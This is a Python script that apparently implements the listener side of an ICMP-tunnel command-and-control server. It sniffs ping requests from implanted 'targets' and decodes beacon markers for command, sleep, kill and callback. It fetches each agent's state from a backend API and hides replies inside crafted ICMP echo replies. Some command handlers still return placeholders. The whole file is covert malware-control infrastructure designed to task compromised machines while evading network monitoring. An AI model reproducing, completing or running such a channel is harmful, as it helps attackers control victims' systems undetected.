from scapy.all import *
import re
from scapy.layers.inet import ICMP, IP
import sqlite3
import requests
from pony import orm
import json
from enum import Enum

#host = '127.0.0.1:8000'
host = '192.168.2.196:8000'

""" 
INPUT CLASS.

#define NUM_INPUTS_ 3
typedef enum {
	/*Command	*/ CO = 0,  // (?)
	/*Sleep		*/ SL = 1,  // {?}
	/*Kill		*/ KI = 2,  // [X]
	/*listen    */ LI = 3,	// |?|
	/*Error		*/ ER = -1  // <x>
} Inputs; 
"""
class _state(Enum):
    COMMAND = 0 
    SLEEP = 1
    KILL = 2
    LISTEN = 3
    ERROR = -1

class Attribute(Enum):
    STATE = "_st" 
    IN = '_in'
    OUT = '_out'
    LASTPING = '_lp'
    DUMP = '_dump'
    IPADDRESS = '_ip'
    INSTANCEID = '_isid'
    TARGETID = '_id'
    NAME = '_n'
    INTERVAL = '_zzz'






class Target:
    def __init__(self, _ip, _st, _dmp, _in, _out, _lp, _isid, _zzz, _n,_id):
        self._ip = _ip
        self._st = _st
        self._dmp = _dmp
        self._in = _in
        self._out = _out
        self._lp = _lp
        self._id = _id  # Auto-incremented primary key
        self._isid = _isid
        self._zzz = _zzz
        self._n = _n

    def to_json(self):

            # Create a dictionary representation of the object
            obj_dict = {
                "_ip": self._ip,
                "_st": self._st,
                "_dmp": self._dmp,
                "_in": self._in,
                "_out": self._out,
                "_lp": self._lp,
                "_id": self._id,
                "_isid": self._isid,
                "_zzz": self._zzz,
                "_n": self._n
            }

            # Convert the dictionary to JSON
            return json.dumps(obj_dict)

def get_state(isid, _id):
    base_url = f"http://{host}"  # Replace with the actual base URL of your API
    endpoint = f"/{isid}/{_id}/gs"
    url = base_url + endpoint
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for HTTP errors (4xx and 5xx)

        # Assuming the response contains JSON data
        #print(response.text)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None
    
def get_sleep(isid, _id):
    base_url = f"http://{host}"  # Replace with the actual base URL of your API
    endpoint = f"/{isid}/{_id}/gz"
    url = base_url + endpoint
    try:
        response = requests.get(url)
        #obj = json.loads(response.text)
        print('***********************888   ',response.text)
        if  isinstance(int(response.text),int) and int(response.text)  > 0  :
            return int(response.text)
        return -1
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

"""

typedef enum {
	/*Command	*/ CO = 0,  // (?)
	/*Sleep		*/ SL = 1,  // {?}
	/*Kill		*/ KI = 2,  // [X]
	/*listen    */ LI = 3,	// |?|
	/*Error		*/ ER = -1  // <x>
} Inputs; 


case 0: pload = "|?|"; break; //What's my next state.
case 1: pload = "(?)"; break; //What's my command.
case 2: pload = "{?}"; break; //what's my interval.
case 3: pload = "[?]"; break; //box called back.
case 5: pload = "[z]"; break; //box called back.

"""

# case 0: pload = "|?|"; break; //Get Input().
# going to sqlite->TARG->BY ID-> _st
def case0(arg):
    result = extract_and_split(arg)
    if not result:
        return -1
    id = get_state(result[1],result[2])
    if id is not None:
        print('state>'+id)
    return id
# case 1: pload = "(?)"; break; //What's my command.
# std::string pload = "(?)&"+hm.INSTANCEID+"&"+hm.TARGETID;
def case1(arg):
    agentdets = arg.split('&')
    #print(agentdets)
    return "OneTwoThreeFour"
# case 2: pload = "{?}"; break; //what's my interval.
def case2(arg):
    return "2"
# case 3: pload = "[?]"; break; //box called back.
def case3(arg):
    return "3"
# case 4: pload = <&<text>&> //some text.
def case4(arg):
    return "4"
# case 5: pload = <5> //some text.
def case5(arg,interval=False):
    result = extract_and_split(arg)
    if not result:
        return -1
    sleepfor = get_sleep(result[1],result[2])
    if sleepfor == 0 :
        if interval :
            return 1000
        return '1'
    return f'{sleepfor}'

cases = {
    0: lambda arg: case0(arg),
    1: lambda arg: case1(arg),
    2: lambda arg: case2(arg),
    3: lambda arg: case3(arg),
    4: lambda arg: case4(arg),
    5: lambda arg: case5(arg,False),
    6: lambda arg: case5(arg,True),
    }   
# r'\|\?\|': 0,
# r'\(\?\)': 1,
# r'\{\?\}': 2,
# r'\[\?\]': 3,
# r'<&([^&>]*)&>':4

def crud(value,beaconId):
    result = cases.get(value, lambda arg: "Invalid case")(beaconId)
    return result



def extract_and_split(input_string):
    # Find the start and end positions of the content between '@' symbols
    start_pos = input_string.find('@')
    end_pos = input_string.rfind('@')

    # Return False if no '@' symbols are found or if they are in the wrong order
    if start_pos == -1 or end_pos == -1 or start_pos >= end_pos:
        return False

    # Extract the content between '@' symbols
    content_between_at_symbols = input_string[start_pos + 1:end_pos]

    # Split the content into tokens using the '&' symbol
    tokens = content_between_at_symbols.split('&')

    return tokens


	# case 0: pload = "|?|"; break; //What's my next state.
        #Should return from the database either.
	# case 1: pload = "(?)"; break; //What's my command.
	# case 2: pload = "{?}"; break; //what's my interval.
	# case 3: pload = "[?]"; break; //box called back.
	# 



def find_pattern(packet):
    hexstr =str(packet[Raw].load)
    # Define the patterns and their associated integers
    #print(hexstr+'*********************************')



    patterns = {
        r'\|\?\|': 0,
        r'\(\?\)': 1,
        r'\{\?\}': 2,
        r'\[\?\]': 3,
        r'\[z\]': 5,
        r'\[i\]': 6,
        r'<&([^&>]*)&>':4,
    }
    # Search for patterns in the input string
    for pattern, value in patterns.items():
        matches = re.findall(pattern, hexstr)
        if matches:
            return value, hexstr  # Return the associated integer for the first match found
    return -1, hexstr  # Return -1 if no pattern is found
# (?)
def listenDecodeIcmp(packet):
    # print(packet.show())
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # Check if it's an ICMP Echo Request (type 8)
        callback = find_pattern(packet)
        out = ''
        if callback is not None: 
            out = crud(callback[0],callback[1])
            print(out)
        try:
            # Craft ICMP Echo Reply packet
        # Ensure the payload size does not exceed a certain limit
            max_payload_size = 100

            # Truncate or pad the 'out' variable to fit within the payload size limit
            truncated_out = out[:max_payload_size].ljust(max_payload_size, '\x00')

            icmp_reply = IP(dst=packet[IP].src) / ICMP(type=0, code=0, id=packet[ICMP].id,
                                                    seq=packet[ICMP].seq) / f"@>{out}<@" 
            #print('THE REPLY: '+str(icmp_reply))
            send(icmp_reply, verbose=2)
            # print("Sent ICMP Echo Reply to", packet[IP].src)
        except Exception as e :
            print(f'Exception :{e}')
# Define a filter for ICMP Echo Request (ping) packets
icmp_filter = "icmp and icmp[icmptype] == 8"
# Specify your LAN IP address as the source
# Capture ICMP packets that match the filter
captured_packets = sniff(filter=icmp_filter, prn=lambda x: listenDecodeIcmp(x))
 